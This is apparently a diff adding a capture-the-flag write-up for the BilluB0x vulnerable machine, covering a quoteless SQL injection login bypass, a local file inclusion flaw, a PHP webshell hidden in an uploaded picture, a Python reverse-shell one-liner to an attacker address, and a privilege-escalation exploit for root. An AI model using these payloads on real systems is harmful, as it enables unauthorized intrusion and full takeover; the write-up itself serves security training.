@@ -1,0 +1,70 @@
+### Notes for BilluB0x
+At first I set up the machine, found its IP using Nmap and scanned its ports. I saw that it had ports 80 and 22 open. I browsed to port 80 and got to the login screen.
+
+# Login
+At first I tried all the trivial SQLi techniques. None of them worked, including sqlmap.
+After that I used dirbuster and 
+Using the "test.php" file I found using dirbuster I could download all the source code of the site. When I downloaded the index.php page I saw the SQL part:
+	if(isset($_POST['login']))
+{
+	$uname=str_replace('\'','',urldecode($_POST['un']));
+	$pass=str_replace('\'','',urldecode($_POST['ps']));
+	$run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
+	$result = mysqli_query($conn, $run);
+	.
+	.
+	.
+}
+
+All of the single quotes are replaced by spaces and I can't URL-Encode them. However, I can use an SQLi without quotes where I escape the first quote and use it as 
+a full string. F.E:
+	ps=\&un= or 1=1;-- -
+which results in the following query:
+	select * from auth where pass='\' and uname =' or 1=1;-- -
+This query granted me access to the panel.php page.
+
+# Panel
+
+After I logged in I was redirected to the panel.php page. It offers basic functionalities such as listing all the users and adding a new one. I used the test.php page 
+to look at the source code. The relevant parts were that all the SQL parts of adding a user are escaped using mysqli_real_escape_string. However, there is a part that
+includes other files that looks like this:
+	if(isset($_POST['continue']))
+{
+	$dir=getcwd();
+	$choice=str_replace('./','',$_POST['load']);
+	
+	if($choice==='add')
+	{
+       		include($dir.'/'.$choice.'.php');
+			die();
+	}
+	
+        if($choice==='show')
+	{
+        
+		include($dir.'/'.$choice.'.php');
+		die();
+	}
+	else
+	{
+		include($dir.'/'.$_POST['load']);
+	}
+	
+}
+
+
+This is absolutely horrible and allows me to include every file I want that is in the current directory or any other directory under it. This, in addition to the ability
+to upload profile pictures to the uploaded_images directory allows me to upload a webshell in a profile picture (after a bit of mangling becuase they do filter the
+uploaded files). I uploaded a picture with the following line in it:
+	if (isset($_GET['a'])) { system($_GET['a']); }
+This means I have a webshell. All I need to do is to send a request to panel.php with a POST parameter of continue which is equal to something and a load paramater set to
+the name of my picture,
+
+# Webshell
+
+In the webshell I run a one-liner reverse shell in python:
+export RHOST="192.168.80.129";export RPORT=13337;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+
+# Privilege escalation
+
+I copied a PE PoC from github: OFS. I compiled it for 32bit, served it through a web server with cURL and ran it from /tmp, which gave me a root shell.
